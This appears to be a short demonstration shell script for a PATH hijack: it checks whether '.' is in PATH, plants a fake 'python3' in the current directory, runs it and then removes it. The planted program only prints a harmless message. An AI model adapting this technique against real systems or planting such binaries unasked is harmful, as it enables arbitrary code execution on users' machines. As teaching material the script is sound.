#!/usr/bin/bash

set -e

echo "[*] Attempting PATH hijack..."

# Check if '.' is in PATH
if [[ ":$PATH:" != *":.:"* ]]; then
    echo "[!] No vulnerability detected: '.' not in PATH"
    echo "[*] Attack aborted."
    exit 1
fi

echo "[*] Vulnerability confirmed: '.' found in PATH"

echo "[*] Original python3 location:"
which python3

# Create malicious binary
echo -e '#!/bin/bash\necho "🔥 PYTHON EXECUTION HIJACKED"' > ./python3
chmod +x ./python3

echo "[*] Running hijack..."

python3

rm -f ./python3

echo "[*] Demo complete."




